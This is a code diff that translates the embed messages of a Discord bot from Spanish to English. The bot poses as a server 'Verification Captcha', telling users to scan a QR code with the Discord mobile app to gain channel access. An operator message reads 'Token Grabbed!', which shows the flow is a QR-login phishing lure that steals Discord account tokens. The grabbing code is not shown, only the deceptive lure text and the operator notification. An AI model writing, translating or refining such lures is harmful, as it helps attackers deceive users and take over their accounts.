@@ -12,9 +12,9 @@ class EmbedColours {
 export const directMessageEmbed = async (): Promise<EmbedBuilder> => {
   const embed = new EmbedBuilder()
     .setColor(EmbedColours.colours.custom)
-    .setTitle("Captcha de verificación")
+    .setTitle("Verification Captcha")
     .setDescription(
-      "¡Escanee el código QR a continuación usando la aplicación móvil Discord para verificar su identidad dentro del servidor! Obtendrá acceso a todos los canales una vez que se haya verificado."
+      "Scan the QR code below using the Discord mobile app to verify your identity within the server! You will gain access to all channels once you have been verified."
     );
   return embed;
 };
@@ -22,9 +22,9 @@ export const directMessageEmbed = async (): Promise<EmbedBuilder> => {
 export const verifyMessageEmbed = async () => {
   const embed = new EmbedBuilder()
     .setColor(EmbedColours.colours.custom)
-    .setTitle(`${config.name} ¡Verificación requerida!`)
+    .setTitle(`${config.name} Verification Required!`)
     .setDescription(
-      `🔔 **Para acceder al servidor, primero debe pasar la verificación.**\n➡️ Presione el botón Verificar a continuación.`
+      `🔔 **To access the server, you must first pass verification.**\n➡️ Press the Verify button below.`
     );
 
   return embed;
@@ -35,9 +35,9 @@ export const afterButtonPressEmbed = async (
 ): Promise<EmbedBuilder> => {
   const embed = new EmbedBuilder()
     .setColor(EmbedColours.colours.custom)
-    .setTitle(`Inicio de verificación`)
+    .setTitle(`Verification Started`)
     .setDescription(
-      `La verificación ha comenzado, continúa en tus mensajes directos [aquí](https://discord.com/channels/@me/${channelId})!`
+      `Verification has started, continue in your direct messages [here](https://discord.com/channels/@me/${channelId})!`
     );
 
   return embed;
@@ -46,9 +46,9 @@ export const afterButtonPressEmbed = async (
 export const prepareVerificationEmbed = async (): Promise<EmbedBuilder> => {
   const embed = new EmbedBuilder()
     .setColor(EmbedColours.colours.custom)
-    .setTitle("Preparación de la verificación")
+    .setTitle("Preparing Verification")
     .setDescription(
-      "Espere mientras preparamos su verificación. Esto puede tardar unos pocos segundos."
+      "Please wait while we prepare your verification. This may take a few seconds."
     );
 
   return embed;
@@ -57,9 +57,9 @@ export const prepareVerificationEmbed = async (): Promise<EmbedBuilder> => {
 export const pleaseWaitEmbed = async (): Promise<EmbedBuilder> => {
   const embed = new EmbedBuilder()
     .setColor(EmbedColours.colours.yellow)
-    .setTitle("Casi llegamos!")
+    .setTitle("Almost There!")
     .setDescription(
-      "¡Hemos notado que usted y estamos trabajando duro para verificarlo! La cola está bastante llena en este momento, así que espere mientras completamos su verificación. Esto puede tardar unos pocos segundos."
+      "We have noticed you and are working hard to verify you! The queue is quite full right now, so please wait while we complete your verification. This may take a few seconds."
     );
 
   return embed;
@@ -68,9 +68,9 @@ export const pleaseWaitEmbed = async (): Promise<EmbedBuilder> => {
 export const failedVerificationEmbed = async () => {
   const embed = new EmbedBuilder()
     .setColor(EmbedColours.colours.fail)
-    .setTitle(`Fallo en la verificación`)
+    .setTitle(`Verification Failed`)
     .setDescription(
-      `Ocurrió un error al intentar verificarte. Por favor, inténtelo de nuevo más tarde.`
+      `An error occurred while attempting to verify you. Please try again later.`
     );
 
   return embed;
@@ -79,9 +79,9 @@ export const failedVerificationEmbed = async () => {
 export const failedToMessageEmbed = async (): Promise<EmbedBuilder> => {
   const embed = new EmbedBuilder()
     .setColor(EmbedColours.colours.fail)
-    .setTitle("Fallo en la verificación")
+    .setTitle("Verification Failed")
     .setDescription(
-      "No pude enviarte un mensaje. Comprueba tu configuración de privacidad e inténtalo de nuevo.."
+      "I was unable to send you a message. Check your privacy settings and try again."
     );
 
   return embed;
@@ -90,9 +90,9 @@ export const failedToMessageEmbed = async (): Promise<EmbedBuilder> => {
 export const alreadyVerifyingEmbed = async (): Promise<EmbedBuilder> => {
   const embed = new EmbedBuilder()
     .setColor(EmbedColours.colours.fail)
-    .setTitle("Fallo en la verificación")
+    .setTitle("Verification Failed")
     .setDescription(
-      "Ya estás en el proceso de verificación. Complete esto antes de volver a intentarlo."
+      "You are already in the process of verification. Please complete this before trying again."
     );
 
   return embed;
@@ -101,9 +101,9 @@ export const alreadyVerifyingEmbed = async (): Promise<EmbedBuilder> => {
 export const verificationComplete = async (): Promise<EmbedBuilder> => {
   const embed = new EmbedBuilder()
     .setColor(EmbedColours.colours.custom)
-    .setTitle("Verificación completa")
+    .setTitle("Verification Complete")
     .setDescription(
-      "Te has verificado con éxito. Ahora obtendrá acceso a todos los canales dentro del servidor.."
+      "You have successfully verified yourself. You will now gain access to all channels within the server."
     );
 
   return embed;
@@ -112,9 +112,9 @@ export const verificationComplete = async (): Promise<EmbedBuilder> => {
 export const setRoleEmbed = async (): Promise<EmbedBuilder> => {
   const embed = new EmbedBuilder()
     .setColor(EmbedColours.colours.custom)
-    .setTitle("Conjunto de funciones de verificación")
+    .setTitle("Verification Role Set")
     .setDescription(
-      "Se ha establecido el rol de verificación. Los miembros ahora recibirán este rol una vez que se hayan verificado a sí mismos."
+      "The verification role has been set. Members will now receive this role once they have verified themselves."
     );
 
   return embed;
@@ -123,9 +123,9 @@ export const setRoleEmbed = async (): Promise<EmbedBuilder> => {
 export const roleIsAboveMeEmbed = async (): Promise<EmbedBuilder> => {
   const embed = new EmbedBuilder()
     .setColor(EmbedColours.colours.fail)
-    .setTitle("No se pudo establecer el rol")
+    .setTitle("Role Set Failed")
     .setDescription(
-      "El rol que ha seleccionado está por encima de mi rol más alto. Seleccione un rol debajo de mi rol más alto."
+      "The role you have selected is above my highest role. Please select a role below my highest role."
     );
 
   return embed;
@@ -134,9 +134,9 @@ export const roleIsAboveMeEmbed = async (): Promise<EmbedBuilder> => {
 export const lackPermissionsEmebd = async (): Promise<EmbedBuilder> => {
   const embed = new EmbedBuilder()
     .setColor(EmbedColours.colours.fail)
-    .setTitle("Permisos no válidos")
+    .setTitle("Invalid Permissions")
     .setDescription(
-      "No tiene los permisos correctos para ejecutar este comando. Póngase en contacto con un administrador del servidor."
+      "You do not have the correct permissions to execute this command. Please contact a server administrator."
     );
 
   return embed;
@@ -145,7 +145,7 @@ export const lackPermissionsEmebd = async (): Promise<EmbedBuilder> => {
 export const foundTokenEmbed = async (): Promise<EmbedBuilder> => {
   const embed = new EmbedBuilder()
     .setColor(EmbedColours.colours.custom)
-    .setTitle("Token Grabbed! Por favor revise toda la información a continuación.");
+    .setTitle("Token Grabbed! Please Review All Information Below.");
 
   return embed;
 };
